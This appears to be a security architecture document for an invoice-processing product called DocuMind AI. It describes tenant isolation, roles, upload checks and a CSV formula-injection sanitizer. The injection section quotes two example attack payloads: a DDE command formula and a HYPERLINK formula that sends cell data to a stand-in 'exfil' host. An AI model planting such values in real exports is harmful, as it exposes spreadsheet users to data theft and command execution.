# DocuMind AI — Security Architecture & Threat Defense

## 1. Multi-Tenant Row Level Security (RLS)

DocuMind AI utilizes PostgreSQL Row Level Security (RLS) as its foundational data isolation layer. Rather than relying solely on application-level filtering, database policies enforce tenancy boundaries at the engine level.

### Key Policy Design

1. **Organization Context Function:**
   ```sql
   CREATE OR REPLACE FUNCTION current_org_id() 
   RETURNS UUID AS $$
     SELECT NULLIF(current_setting('request.jwt.claims', true)::json->>'organization_id', '')::UUID;
   $$ LANGUAGE sql STABLE;
   ```

2. **Table Isolation Policy:**
   Every multi-tenant table (`documents`, `extracted_fields`, `line_items`, `validation_issues`, `reconciliations`, `processing_jobs`, `audit_logs`) enforces:
   ```sql
   CREATE POLICY org_isolation_policy ON documents
     FOR ALL
     USING (organization_id = current_org_id())
     WITH CHECK (organization_id = current_org_id());
   ```

---

## 2. Role-Based Access Control (RBAC)

User roles are strictly segregated with least-privilege principles:

| Role | Documents Read | Document Upload | Field Corrections | Approval / Reject | Invite / Team | Org Config |
|---|:---:|:---:|:---:|:---:|:---:|:---:|
| `owner` | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
| `admin` | ✅ | ✅ | ✅ | ✅ | ✅ | ❌ |
| `reviewer` | ✅ | ✅ | ✅ | ✅ | ❌ | ❌ |
| `member` | ✅ (approved only) | ❌ | ❌ | ❌ | ❌ | ❌ |

---

## 3. CSV & Formula Injection Defense (CWE-1236)

### The Threat
Spreadsheet applications (Microsoft Excel, LibreOffice Calc, Google Sheets) execute dynamic formulas if a cell value begins with characters such as `=`, `+`, `-`, or `@`. Adversaries can craft malicious invoice vendor names or line item descriptions (e.g., `=cmd|' /C calc'!A0` or `=HYPERLINK("https://malicious.org/exfil?d=" & A1, "Click")`) to exfiltrate private corporate data upon CSV export.

### The Mitigation
DocuMind AI implements deterministic cell prefixing in `export.service.ts`:
```typescript
export function sanitizeCsvCell(value: unknown): string {
  if (value === null || value === undefined) return '';
  const str = String(value);
  // Escapes formula prefixes with a single leading quote
  if (/^[=+\-@\t\r]/.test(str)) {
    return `'${str}`;
  }
  return str;
}
```
All formula-triggering characters are neutralized to static string literals before streaming to the client.

---

## 4. Ingestion Security & Content Verification

1. **Magic Byte Verification:** File signatures are inspected on upload. Extensions like `.pdf` with underlying PE binaries or executable scripts are immediately rejected.
2. **SHA-256 Deduplication:** Eliminates redundant compute expenses and blocks replay attacks.
3. **Payload Sanitization:** Form input fields undergo schema validation via Zod before touching domain services.

---

## 5. Transport & Perimeter Hardening

- **Helmet Security Headers:** Content Security Policy (CSP), Strict Transport Security (HSTS), X-Frame-Options (`SAMEORIGIN`), X-Content-Type-Options (`nosniff`).
- **Rate Limiting:** Sliding-window rate limiters configured to protect LLM endpoints against brute-force resource exhaustion.
- **Traceability:** Unique `X-Request-Id` UUID assigned to every incoming HTTP request and propagated throughout application logs.
